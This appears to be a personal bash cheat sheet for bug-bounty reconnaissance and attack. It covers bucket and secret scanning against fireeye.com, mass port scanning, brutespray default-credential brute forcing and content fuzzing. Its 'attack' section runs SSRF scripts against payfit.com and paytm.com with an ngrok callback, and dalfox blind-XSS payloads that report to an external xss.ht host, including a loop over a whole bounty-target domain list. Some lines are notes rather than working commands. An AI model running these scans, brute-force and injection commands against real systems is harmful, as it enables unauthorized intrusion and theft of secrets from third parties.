#!/bin/bash

GO111MODULE=on go get -u -v github.com/projectdiscovery/shuffledns/cmd/shuffledns
# domain analysis

# cloud bucket
  git clone https://github.com/eth0izzle/bucket-stream.git
  cd bucket-stream
  pip3 install -r requirements.txt
  python3 bucket-stream.py
  python ./s3scanner.py -l fireeye.com -d -o bucket.txt

# cloud security
  export CENSYS_API_ID=...
  export CENSYS_API_SECRET=...
  python cloudflair.py myvulnerable.site
  python3 cloudfail.py --target fireeye.com 

  git clone https://github.com/m0rtem/CloudFail.git
  cd CloudFail
  pip3 install -r requirements.txt
  python3 cloudfail.py --target fireeye.com 

# url anaysis

  cat alive.txt | subjs| tee -a js.txt
  python linkfinder.py -i js.txt -o cli #results.html
  cat js.txt | while read url;do python3 ~/tools/LinkFinder/linkfinder.py -d -i $url -o cli;done > endpoints.txt
  python3 JSFinder.py -u https://www.fireeye.com/ -d -ou fireeye_url.txt -os fireeye_domain.txt
  python3 DumpsterDiver.py -p fireeye --level 3 -s -r -o fireeye.json
  python3 SecretFinder.py -i https://fireeye.com -e -o cli #results.html
  cat ../wb.txt |egrep -iv '\.json'|grep -iE '\.js'|antiburl|awk '{print $4}' | xargs -I %% bash -c 'python3 ~/tools/SecretFinder/SecretFinder.py -i %% -o cli' 2> /dev/null | tee -a secrets.txt
  cat js.txt |egrep -iv '\.json'|grep -iE '\.js'|antiburl|awk '{print $4}' | xargs -I %% bash -c 'python3 ~/tools/SecretFinder/SecretFinder.py -i %% -o cli' 2> /dev/null | tee -a secrets.txt
  whatweb -i alive.txt | tee -a whatweb_op.txt

# Gathering IP Addresses 
  cat $CUR_DIR/all.txt | xargs -n1 -P10 -I{} python3 ~/tools/recon/getip.py {} 2> /dev/null|grep IP | awk '{print $2}' | sort -u | tee -a $CUR_DIR/ip.txt

  cat $CUR_DIR/ip.txt | python3 ~/tools/Shodanfy.py/shodanfy.py --stdin --getvuln --getports --getinfo --getbanner | tee -a $CUR_DIR/shodan.txt
  massscan -p1-65535 ip --max-rate 1800 -oG outputfile.txt
  masscan -p80,443,8020,50070,50470,19890,19888,8088,8090,2075,2076,6443,3868,3366,8443,8080,9443,9091,3000,8000,5900,8081,6000,10000,8181,3306,5000,10000,4000,8888,5432,15672,9999,161,4044,7077,4040,9000,8089,7447,7080,8880,8983,5673,7443,19000,19080 --rate=100000 --open -iL $1 --banners -oG famous_ports.txt
  Portanalysis - Dnmasscan	
  dnmasscan outputfile.txt dns.log -p80,443 -oG masscan.log
  # Service scanning - Brutespray	scan the remote administration protocls for default passwords which takes nmap OG file
  Massscan -> nmapservice scan -oG -> brutespray credential bruteforce

  #vulners nmap script to find vulnerabilities installation
  #git clone https://github.com/scipag/vulscan scipag_vulscan
  ln -s `pwd`/scipag_vulscan /usr/share/nmap/scripts/vulscan    
  To run:- nmap -sV --script=vulscan/vulscan.nse www.example.com
  nmap -sS -sU -sV -p- url without HTTP

# Content Discovery
  /root/go/bin/./ffuf -u $1/FUZZ -w /root/tools/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt -r
  /root/go/bin/./ffuf -u $1/FUZZ -w /root/wordlist/apiwordlist.txt -r -t 200
  cat /root/targets/$1/*.ffuf | sort -u | tee -a /root/newtargets/$1/content_discovered.txt
  ffuf -u $1/FUZZ -mc 200,301,302,403,401 -t 150 -w ~/tools/dirsearch/db/ffuf_extension.txt

  python3 dirsearch.py -e . -u $1
  /root/tools/dirsearch/./dirsearch.py -u $1/fuzz -e php,asp,aspx,jsp,html,zip,jar  -w /root/tools/dirsearch/dicc.txt -t 50 | tee -a /root/targets/$1/dirsearchresults.txt
  /root/tools/dirsearch/./dirsearch.py -e php,jsp,html,zip -L /root/targets/$1/interesting.txt -w /root/wordlist/dicc.txt — recursive -R 2 --plain-text-report=/root/newtargets/$1/dirsearchresults_inputfile1.txt
  /root/tools/dirsearch/./dirsearch.py -e php,jsp,html,zip -L /root/targets/$1/interesting.txt -w /root/wordlist/apiwordlist.txt — recursive -R 2 --plain-text-report=/root/targets/$1/dirsearchresults_inputfile.txt

# miscellaneous
  cat bfacOUTPUT | grep -v "\: 0"| grep \.svn | egrep "200|401|403"| awk '{print $2}' | sed 's#/# #'g | awk '{print $2}' | sort -u  > svn_check
  cat bfacOUTPUT | grep -v "\: 0"| grep \.git | egrep "200|401|403"| awk '{print $2}' | sed 's#/# #'g | awk '{print $2}' | sort -u > git_check
# attack 
  ./ssrfire.sh payfit.com  http://280bcfcd.ngrok.io hosts
  ./ssrfhussien.sh paytm.com  http://280bcfcd.ngrok.io
  python3 openredirex.py -u "https://vulnerable.com/?url=FUZZ" -p payloads.txt --keyword FUZZ  
  xsstrike
  Dalfox:
    gospider -S tageturls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'|grep "=" | qsreplace -a | dalfox pipe -o result.txt

    cat target_list| gau | egrep -o "http?.*" | grep "="| egrep -v ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | dalfox pipe -blind

    dalfox url http://testphp.vulnweb.com/listproducts.php\?cat\=123\&artist\=123\&asdf\=ff -b https://dash.xss.ht
    dalfox file urls_file --custom-payload ./mypayloads.txt
    cat urls_file | dalfox pipe -H "AuthToken: bbadsfkasdfadsf87"  
     echo "target.com" | waybackurls | grep "=" | dalfox pipe -b https://dash.xss.ht
    for i in `cat ../bounty-targets-data/data/domains.txt `; do echo "$i" | waybackurls | grep "=" | ~/go/bin/dalfox pipe -b https://dash.xss.ht; done
# yet to assign
  gospider -S tageturls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg)" --other-source | grep -e "code-200" | awk '{print $5}'|grep "=" | qsreplace -a | dalfox pipe -o result.txt
  cat target_list| gau | egrep -o "http?.*" | grep "="| egrep -v ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | dalfox pipe -blind
  [ -s apiwords.txt ] && echo "JSP Urls saved to apiwords.txt"
